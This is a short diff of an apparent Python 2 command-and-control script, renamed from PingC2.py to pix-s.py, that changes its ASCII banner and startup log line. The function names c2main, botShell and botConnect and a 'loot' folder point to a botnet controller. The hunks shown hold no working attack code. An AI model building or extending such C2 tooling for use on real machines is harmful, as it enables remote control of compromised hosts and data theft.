@@ -381,19 +381,18 @@ def c2main(command,botShell,botConnect):
                         	logfile_error.write(error)
 
 def main(flag):
-	print "	---------------------------------------------"
-	print "	  _____    _                    _____   ___  "
- 	print "	 |  __ \  (_)                  / ____| |__ \ "
- 	print "	 | |__) |  _   _ __     __ _  | |         ) |"
- 	print "	 |  ___/  | | | '_ \   / _` | | |        / / "
- 	print "	 | |      | | | | | | | (_| | | |____   / /_ "
- 	print "	 |_|      |_| |_| |_|  \__, |  \_____| |____|"
-        print "        		        _/ |                "
-        print "	 		      |___/		    "
-        print "	 					    "
-	print "	 		Command Center              "
-	print "	 		   by NoCow		    "
-	print "	---------------------------------------------"
+	os.system("clear")
+	print "---------------------------------"
+	print "______ ___   __      _____ _____ "
+	print "| ___ (_\ \ / /     /  __ / __  \""
+	print "| |_/ /_ \ V /______| /  \`' / /'"
+	print "|  __/| |/   |______| |     / /  "
+	print "| |   | / /^\ \     | \__/./ /___"
+	print "\_|   |_\/   \/      \____\_____/"
+	print "		Command Center		"
+	print "		   by NoCow	        "                                 
+	print "---------------------------------"                                 
+
 	global dbusername
 	global dbpassword
 	
@@ -559,7 +558,7 @@ if __name__ == "__main__":
 		os.makedirs('loot')	
 	
 	printLine("--------------------------------------------",flag)
-	printLine("PingC2.py started on %s" % (date.today()),flag)
+	printLine("pix-s.py started on %s" % (date.today()),flag)
 	printLine("--------------------------------------------",flag)
 	printLine("[D] flag=%s" % (flag),flag)
 	main(flag)
